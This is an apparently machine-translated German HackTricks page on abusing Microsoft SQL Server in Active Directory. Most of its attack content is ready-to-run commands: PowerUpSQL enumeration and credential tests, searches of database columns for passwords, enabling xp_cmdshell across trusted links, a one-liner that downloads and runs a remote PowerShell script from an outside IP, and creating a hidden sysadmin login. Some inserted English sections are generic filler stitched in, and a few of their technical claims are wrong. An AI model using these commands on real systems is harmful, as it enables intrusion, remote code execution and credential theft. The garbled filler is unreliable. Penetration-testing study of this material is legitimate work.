# MSSQL AD Missbrauch

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** senden.

</details>

## **MSSQL Enumeration / Entdeckung**

Das PowerShell-Modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ist in diesem Fall sehr nützlich.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumerieren aus dem Netzwerk ohne Domänen-Sitzung

Wenn Sie keinen Domänenbenutzer haben, können Sie dennoch Informationen über den Active Directory-Dienst erhalten, indem Sie das Netzwerk scannen und verschiedene Techniken zur Informationsgewinnung anwenden. Hier sind einige Möglichkeiten, wie Sie dies tun können:

1. **Portscanning**: Verwenden Sie Tools wie Nmap, um offene Ports auf den Zielmaschinen zu identifizieren. Dies kann Ihnen Informationen über die verwendeten Dienste und deren Versionen geben.

2. **LDAP-Abfragen**: Verwenden Sie Tools wie ldapsearch, um Informationen über Benutzer, Gruppen und andere Objekte im Active Directory abzurufen. Sie können nach spezifischen Attributen suchen, um weitere Informationen zu erhalten.

3. **DNS-Zonentransfer**: Überprüfen Sie, ob der DNS-Server des Active Directory Zonentransfers zulässt. Wenn dies der Fall ist, können Sie möglicherweise Informationen über die Domänenstruktur und die gehosteten Dienste erhalten.

4. **SNMP-Abfragen**: Wenn SNMP auf den Zielmaschinen aktiviert ist, können Sie SNMP-Abfragen verwenden, um Informationen über das Netzwerk und die gehosteten Dienste zu erhalten.

5. **SMB-Enumeration**: Verwenden Sie Tools wie enum4linux oder smbmap, um Informationen über Freigaben, Benutzer und Gruppen im Netzwerk zu erhalten.

6. **NetBIOS-Enumeration**: Verwenden Sie Tools wie nbtscan oder nbtenum, um Informationen über NetBIOS-Namen, IP-Adressen und gehostete Dienste zu erhalten.

Es ist wichtig zu beachten, dass diese Techniken nur begrenzte Informationen liefern können und möglicherweise nicht alle Details des Active Directory-Dienstes preisgeben. Es wird empfohlen, diese Techniken in Verbindung mit anderen Methoden zur Informationsgewinnung zu verwenden, um ein umfassendes Bild des Netzwerks zu erhalten.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumerieren von innen in der Domäne

To gather information about the Active Directory (AD) environment from within the domain, you can use various techniques. These techniques allow you to enumerate users, groups, computers, and other objects in the AD.

#### 1. LDAP Queries

LDAP (Lightweight Directory Access Protocol) queries can be used to retrieve information from the AD. You can use tools like `ldapsearch` or `ADSIEdit` to perform LDAP queries and gather information about users, groups, and other objects.

#### 2. Enumerating Users and Groups

You can enumerate users and groups in the AD by querying the `samAccountName` attribute. This attribute contains the username or group name. Tools like `net user` or `net group` can be used to enumerate users and groups.

#### 3. Enumerating Computers

To enumerate computers in the AD, you can query the `servicePrincipalName` attribute. This attribute contains the names of services associated with a computer object. Tools like `net view` or `dsquery` can be used to enumerate computers.

#### 4. Enumerating Domain Controllers

To enumerate domain controllers in the AD, you can query the `userAccountControl` attribute. This attribute contains information about the account type, including whether it is a domain controller. Tools like `nltest` or `dsquery` can be used to enumerate domain controllers.

#### 5. Enumerating Trust Relationships

To enumerate trust relationships in the AD, you can query the `trustPartner` attribute. This attribute contains information about trusted domains. Tools like `nltest` or `dsquery` can be used to enumerate trust relationships.

By using these techniques, you can gather valuable information about the AD environment from within the domain. This information can be useful for further enumeration and exploitation during a penetration test.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
To access an MSSQL database, you can use the following methods:

1. **SQL Server Management Studio (SSMS):** This is a graphical tool provided by Microsoft to manage MSSQL databases. You can connect to the database server using SSMS and access the database.

2. **Command Line Tools:** MSSQL provides command line tools such as `sqlcmd` and `osql` that allow you to execute SQL queries and commands directly from the command prompt.

3. **Programming Languages:** You can use programming languages like Python, Java, or C# to connect to the MSSQL database and perform operations using libraries or frameworks such as pyodbc, JDBC, or ADO.NET.

### Exploiting Weak Credentials

If you have weak or default credentials for an MSSQL database, you can exploit them to gain unauthorized access. Here are some techniques you can use:

1. **Brute-Force Attacks:** Use tools like Hydra or Medusa to perform brute-force attacks against the MSSQL server, trying different username and password combinations until you find a valid one.

2. **Password Spraying:** Instead of trying multiple passwords for a single user, try a single password against multiple user accounts. This technique is effective when organizations use weak passwords across multiple accounts.

3. **Credential Stuffing:** Use a list of known usernames and passwords obtained from previous data breaches to try and gain access to the MSSQL database.

### Exploiting SQL Injection Vulnerabilities

If the application connected to the MSSQL database is vulnerable to SQL injection, you can exploit this vulnerability to gain unauthorized access. Here's how:

1. **Identify SQL Injection Points:** Use techniques like manual testing, automated scanners, or fuzzing to identify potential SQL injection vulnerabilities in the application.

2. **Craft SQL Injection Payloads:** Once you have identified a SQL injection point, craft SQL payloads that can manipulate the database query and retrieve sensitive information or perform unauthorized actions.

3. **Exploit the Vulnerability:** Inject the crafted SQL payloads into the vulnerable application and observe the response to confirm successful exploitation.

### Exploiting Misconfigurations

Misconfigurations in the MSSQL server or the connected application can also lead to unauthorized access. Here are some common misconfigurations to look for:

1. **Weak or Default Passwords:** Check if the MSSQL server or the connected application is using weak or default passwords. If so, try to gain access using these credentials.

2. **Unrestricted Database Permissions:** Look for database users or roles with excessive permissions. If you find any, you can abuse these permissions to gain unauthorized access.

3. **Unpatched Vulnerabilities:** Check if the MSSQL server or the connected application has any known vulnerabilities that have not been patched. Exploit these vulnerabilities to gain unauthorized access.

Remember, always ensure you have proper authorization before attempting any of these techniques. Unauthorized access to a database is illegal and can result in severe consequences.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Es könnte auch möglich sein, Befehle innerhalb des MSSQL-Hosts auszuführen.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Überprüfen Sie auf der Seite im **folgenden Abschnitt, wie Sie dies manuell tun können.**

### MSSQL Grundlegende Hacking-Tricks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Vertrauenswürdige Verbindungen

Wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz vertraut wird (Datenbankverbindung). Wenn der Benutzer Berechtigungen für die vertrauenswürdige Datenbank hat, kann er **die Vertrauensbeziehung nutzen, um auch in der anderen Instanz Abfragen auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und der Benutzer kann möglicherweise eine fehlerhaft konfigurierte Datenbank finden, in der er Befehle ausführen kann.

**Die Verbindungen zwischen Datenbanken funktionieren sogar über Forstvertrauensstellungen hinweg.**

### Powershell-Missbrauch
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Sie können ganz einfach mit Metasploit nach vertrauenswürdigen Links suchen.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Beachten Sie, dass Metasploit nur die Funktion `openquery()` in MSSQL missbrauchen wird (wenn Sie also keine Befehle mit `openquery()` ausführen können, müssen Sie die `EXECUTE`-Methode **manuell** ausprobieren, um Befehle auszuführen, siehe unten).

### Manuell - Openquery()

Von **Linux** aus können Sie eine MSSQL-Konsolenshell mit **sqsh** und **mssqlclient.py** erhalten.

Von **Windows** aus können Sie auch die Links finden und Befehle manuell mit einem **MSSQL-Client wie** [**HeidiSQL**](https://www.heidisql.com) ausführen.

_Anmeldung mit Windows-Authentifizierung:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Vertrauenswürdige Links finden
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Führen Sie Abfragen in vertrauenswürdigen Links aus

Führen Sie Abfragen über den Link aus (Beispiel: finden Sie weitere Links in der neuen zugänglichen Instanz):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden, es ist wichtig, sie auf diese Weise zu verwenden.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Sie können diese vertrauenswürdigen Linkketten manuell endlos fortsetzen.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Wenn Sie Aktionen wie `exec xp_cmdshell` von `openquery()` nicht ausführen können, versuchen Sie es mit der Methode `EXECUTE`.

### Manuell - EXECUTE

Sie können auch vertrauenswürdige Links mit `EXECUTE` missbrauchen:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Lokale Privilege-Eskalation

Der **MSSQL-Local-User** hat normalerweise eine spezielle Art von Privileg namens **`SeImpersonatePrivilege`**. Dadurch kann das Konto "einen Client nach der Authentifizierung imitieren".

Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-Dienst dazu zu zwingen, sich bei einem von einem Angreifer erstellten Rogue- oder Man-in-the-Middle-Dienst anzumelden. Dieser Rogue-Dienst kann sich dann als der SYSTEM-Dienst ausgeben, während er versucht, sich anzumelden.

[SweetPotato](https://github.com/CCob/SweetPotato) enthält eine Sammlung dieser verschiedenen Techniken, die über den Befehl `execute-assembly` von Beacon ausgeführt werden können.

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS erhalten oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>
